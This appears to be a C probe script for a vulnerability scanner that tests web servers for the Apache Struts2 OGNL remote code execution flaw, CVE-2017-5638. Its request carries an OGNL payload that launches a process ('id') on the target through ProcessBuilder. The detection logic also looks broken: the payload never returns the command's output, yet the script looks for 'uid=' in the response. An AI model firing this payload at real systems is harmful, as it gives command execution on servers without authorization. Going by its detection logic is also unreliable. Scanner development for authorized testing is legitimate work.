/* http-vuln-cve2017-5638-3 - Struts2 OGNL RCE probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    const char *body;
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "POST", "/", NULL, "\r\n",
                        "%{(#_='multipart/form-data').(#cmd='id')."
                        "(#p=new java.lang.ProcessBuilder(#cmd))."
                        "(#p.start())}",
                        "application/x-www-form-urlencoded",
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "CVE-2017-5638: no response");
        return 0;
    }
    body = ar_http_body(resp);
    if (ar_contains_ci(body, "uid=") || ar_contains_ci(body, "gid=")) {
        ar_out(ctx, "VULNERABLE: CVE-2017-5638 Struts2 RCE");
    } else {
        ar_out(ctx, "not vulnerable: CVE-2017-5638 (HTTP %d)",
               ar_http_status(resp));
    }
    return 0;
}
